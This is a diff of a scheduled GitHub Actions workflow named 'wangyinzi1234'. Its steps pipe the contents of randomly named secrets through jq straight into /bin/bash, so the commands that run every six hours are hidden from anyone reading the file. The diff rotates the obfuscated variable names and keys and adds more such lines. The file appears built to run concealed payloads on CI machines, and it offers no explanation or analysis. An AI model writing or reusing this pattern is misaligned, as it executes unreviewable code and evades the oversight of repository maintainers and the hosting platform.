@@ -1,23 +1,31 @@
 name: wangyinzi1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '15 4/6 * * *'
 
-jobs:  # 6623
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wangyinzi1234
         env:
-          inj03: ${{ secrets.inj03 }}
+          l03: ${{ secrets.l03 }}
         run: |
-          echo $inj03 | jq -r .eox976 | /bin/bash
-          echo $sqwn47635 | jq -r .oq00432 | /bin/bash
-          echo $nl25 | jq -r .ay76008 | /bin/bash
-          echo $tlfct16136 | jq -r .kf517 | /bin/bash
-          echo $kt354 | jq -r .l2 | /bin/bash
-          echo $p777 | jq -r .ni1 | /bin/bash
+          echo $l03 | jq -r .gjfb7407 | /bin/bash
+          echo $h501 | jq -r .m21191 | /bin/bash
+          echo $s3 | jq -r .rrtc96782 | /bin/bash
+          echo $o8917 | jq -r .f176 | /bin/bash
+          echo $px5 | jq -r .sckyc365 | /bin/bash
+          echo $qzu60 | jq -r .sb17 | /bin/bash
+          echo $zgapr40828 | jq -r .noke6258 | /bin/bash
+          echo $qrc31 | jq -r .ap1 | /bin/bash
+          echo $i7720 | jq -r .oozfd6 | /bin/bash
+          echo $gx81738 | jq -r .si0 | /bin/bash
+          echo $ybiwp59 | jq -r .rfjjd623 | /bin/bash
+          echo $i17684 | jq -r .vxi871 | /bin/bash
+          echo $wos6260 | jq -r .upjff427 | /bin/bash
+          echo $kgrk789 | jq -r .qmdec605 | /bin/bash
+          echo $zkmp70 | jq -r .xb33 | /bin/bash
 
